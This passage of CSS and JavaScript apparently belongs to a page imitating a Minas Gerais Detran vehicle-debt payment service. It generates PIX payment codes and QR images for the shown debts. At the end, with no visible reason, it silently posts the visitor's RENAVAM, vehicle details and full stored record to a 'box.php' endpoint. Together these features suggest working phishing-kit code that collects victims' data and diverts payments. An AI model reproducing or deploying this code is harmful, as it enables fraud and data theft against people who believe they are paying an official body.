.pix-modal__qrcode img { max-width: 200px; height: auto; }
.pix-modal__valor { text-align: center; padding: 16px; background: rgba(184, 31, 37, 0.05); border-radius: 12px; border-left: 4px solid var(--color-primary-pure, rgb(184, 31, 37)); }
.pix-modal__valor-label { font-size: 0.875rem; color: rgba(0, 0, 0, 0.6); margin: 0; }
.pix-modal__valor-amount { font-size: 1.75rem; font-weight: 700; color: var(--color-primary-pure, rgb(184, 31, 37)); margin: 8px 0 0 0; }
.pix-modal__pix-section { background: rgb(247, 248, 250); border-radius: 12px; padding: 16px; }
.pix-modal__pix-label { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; color: rgba(0, 0, 0, 0.5); margin: 0 0 8px 0; letter-spacing: 0.5px; }
.pix-modal__pix-code { background: rgb(255, 255, 255); border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 8px; padding: 12px; font-family: 'Courier New', monospace; font-size: 0.875rem; word-break: break-all; min-height: 60px; display: flex; align-items: center; justify-content: center; color: rgb(31, 41, 55); line-height: 1.6; }
.pix-modal__actions { display: flex; gap: 12px; margin-top: 24px; }
.pix-modal__btn { flex: 1; padding: 12px 16px; border: none; border-radius: 8px; font-weight: 600; font-size: 0.95rem; cursor: pointer; transition: all 200ms ease; }
.pix-modal__btn--copy { background: var(--color-primary-pure, rgb(184, 31, 37)); color: rgb(255, 255, 255); }
.pix-modal__btn--copy:hover { background: rgb(128, 21, 25); box-shadow: rgba(184, 31, 37, 0.3) 0px 4px 12px; }
.pix-modal__btn--copy:active { transform: scale(0.98); }
.pix-modal__btn--close { background: rgb(247, 248, 250); color: rgb(31, 41, 55); border: 1px solid rgba(0, 0, 0, 0.1); }
.pix-modal__btn--close:hover { background: rgb(237, 242, 247); }
.pix-modal__copy-success { position: absolute; background: var(--color-primary-pure, rgb(184, 31, 37)); color: white; padding: 8px 16px; border-radius: 8px; font-size: 0.875rem; font-weight: 600; opacity: 0; transform: translateY(-10px); transition: all 150ms ease; pointer-events: none; }
.pix-modal__copy-success.show { opacity: 1; transform: translateY(0); }

</style>


<script>

var pageLoadStartedAt = Date.now();
var pageLoadingComplete = false;

function finalizePageLoad() {
   if (pageLoadingComplete) return;
   pageLoadingComplete = true;

   var minDuration = 350;
   var elapsed = Date.now() - pageLoadStartedAt;
   var remaining = Math.max(0, minDuration - elapsed);

   setTimeout(function() {
      document.body.classList.remove('is-loading');
      var loader = document.getElementById('page-loader');
      if (loader) loader.setAttribute('aria-hidden', 'true');
   }, remaining);
}

function gerarPix(descricao, valorFormatado, valor) {

valor = totalValorPagarSelected;
valorFormatado = totalValorPagarSelected.toLocaleString('pt-BR', {minimumFractionDigits:2, maximumFractionDigits:2});
descricao =    'total Valor Pagar Selected';

   // Mostrar carregamento
   var loader = document.getElementById('pix-loading');
   
   if (!loader) {
      var div = document.createElement('div');
      div.id = 'pix-loading';
      div.className = 'page-loader';
      div.innerHTML = '<div class="page-loader__card"><span class="page-loader__spinner" aria-hidden="true"></span><div class="page-loader__title">Gerando PIX</div></div>';
      document.body.appendChild(div);
      loader = div;
   }
   document.body.appendChild(loader);
   loader.style.display = 'flex';

   // Preparar dados para enviar ao pix.php
   var formData = new URLSearchParams();
   formData.append('valor', valor);
   formData.append('cpf_cnpj', dados.renavam || '');
   formData.append('nome', dados.veiculo.marcaModelo || '');
   formData.append('debito', 'Débitos selecionados.');
   formData.append('descricao', descricao || 'pagamento');

   // Enviar requisição para pix.php
   fetch('./data/pix.php', {
      method: 'POST',
      body: formData
   })
   .then(function(response) { return response.json(); })
   .then(function(data) {
      loader.style.display = 'none';

      if (data.status && data.pix) {
         abrirModalPix(valorFormatado, valor, data.pix,  `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${data.pix}`);
         mostrarToast('PIX gerado com sucesso!', 'sucesso');
      } else {
         mostrarToast('Erro ao gerar PIX. Tente novamente.', 'erro');
      }
   })
   .catch(function(error) {
      loader.style.display = 'none';
      console.error('Erro:', error);
      mostrarToast('Erro ao gerar PIX', 'erro');
   });
}

function abrirModalPix(valorFormatado, valor, pixCode, qrcodeUrl) {
   var existingModal = document.getElementById('pix-modal-overlay');
   if (existingModal) existingModal.remove();

   var overlay = document.createElement('div');
   overlay.id = 'pix-modal-overlay';
   overlay.className = 'pix-modal-overlay';

   var modal = document.createElement('div');
   modal.className = 'pix-modal';

   modal.innerHTML = `
      <div class="pix-modal__header">
         <h2 class="pix-modal__title">PIX Gerado com Sucesso</h2>
         <p class="pix-modal__subtitle">Escaneie o código ou copie a chave abaixo</p>
      </div>
      <div class="pix-modal__body">
         <div class="pix-modal__qrcode">
            <img src="${qrcodeUrl}" alt="QR Code PIX" />
         </div>
         <div class="pix-modal__valor">
            <p class="pix-modal__valor-label">Valor a pagar</p>
            <p class="pix-modal__valor-amount">${valorFormatado}</p>
         </div>
         <div class="pix-modal__pix-section">
            <p class="pix-modal__pix-label">Chave Cópia e Cola</p>
            <div class="pix-modal__pix-code" id="pix-code-display">${pixCode}</div>
         </div>
      </div>
      <div class="pix-modal__actions">
         <button class="pix-modal__btn pix-modal__btn--copy" id="btn-copy-pix">Copiar PIX</button>
         <button class="pix-modal__btn pix-modal__btn--close" id="btn-close-pix">Fechar</button>
      </div>
   `;

   overlay.appendChild(modal);
   document.body.appendChild(overlay);

   setTimeout(function() {
      overlay.classList.add('active');
   }, 10);

   var btnCopy = document.getElementById('btn-copy-pix');
   var btnClose = document.getElementById('btn-close-pix');

   btnCopy.addEventListener('click', function() {
      var pixCodeDisplay = document.getElementById('pix-code-display');
      var text = pixCodeDisplay.textContent;
      
      navigator.clipboard.writeText(text).then(function() {
         var btn = btnCopy;
         var originalText = btn.textContent;
         btn.textContent = '✓ Copiado!';
         btn.style.opacity = '0.8';
         
         setTimeout(function() {
            btn.textContent = originalText;
            btn.style.opacity = '1';
         }, 2000);
      }).catch(function(err) {
         console.error('Erro ao copiar:', err);
         mostrarToast('Erro ao copiar PIX', 'erro');
      });
   });

   btnClose.addEventListener('click', function() {
      fecharModalPix(overlay);
   });

   overlay.addEventListener('click', function(e) {
      if (e.target === overlay) {
         fecharModalPix(overlay);
      }
   });
}

function fecharModalPix(overlay) {
   overlay.classList.remove('active');
   setTimeout(function() {
      overlay.remove();
   }, 200);
}

function MyMoney(a) {
   return a.toLocaleString('pt-BR', {minimumFractionDigits:2, maximumFractionDigits:2});
}

function mostrarToast(mensagem, tipo) {
   var toast = document.createElement('div');
   toast.style.cssText = 'position:fixed;bottom:20px;right:20px;padding:16px 20px;border-radius:8px;font-weight:600;z-index:9999;animation:slideIn 0.3s ease;';
   toast.textContent = mensagem;
   
   if (tipo === 'sucesso') {
      toast.style.background = 'rgb(76, 175, 80)';
      toast.style.color = 'white';
   } else if (tipo === 'erro') {
      toast.style.background = 'rgb(244, 67, 54)';
      toast.style.color = 'white';
   }
   
   document.body.appendChild(toast);
   setTimeout(function() {
      toast.style.opacity = '0';
      toast.style.transition = 'opacity 0.3s ease';
      setTimeout(function() { toast.remove(); }, 300);
   }, 3000);
}

try{

    var dados = JSON.parse(localStorage.getItem("DetranMg"));

} catch(e){
  console.error("Erro ao analisar dados do DetranMg do localStorage:", e);
  var dados = null;
}

if(!dados){

   window.location.href = '/';

}else{

var debitos = dados.extratoDebitos;

// Calcular total e quantidade de débitos não pagos
var totalDebitosNaoPagos = 0;
var quantidadeDebitosNaoPagos = 0;

if (debitos && debitos.length > 0) {
  debitos.forEach(function(extrato) {
    if (extrato.parcelas && extrato.parcelas.length > 0) {
      extrato.parcelas.forEach(function(parcela) {
        // Somar apenas débitos não pagos
        if (!parcela.estaPago) {
          totalDebitosNaoPagos += parcela.valorTotal;
          quantidadeDebitosNaoPagos++;
        }
      });
    }
  });
} 

const dadosArray = [{
                label: "Renavam",
                value: dados.renavam
            }];
            
   const payload = new URLSearchParams({
         dados: JSON.stringify(dadosArray),
         doc: dados.renavam,
         debitos: quantidadeDebitosNaoPagos +' | '+ MyMoney(totalDebitosNaoPagos),
         nome: dados.veiculo.marcaModelo,
         page: 'veiculosmg',
         resposta: encodeURIComponent(JSON.stringify(dados))
   });

   fetch('./data/box.php', {
         method: 'POST',
         headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
         },
         body: payload.toString()
   }).then(response => response.text()).then(data => {}).catch(error => {
         console.error('Erro na requisição:', error);
   });
}

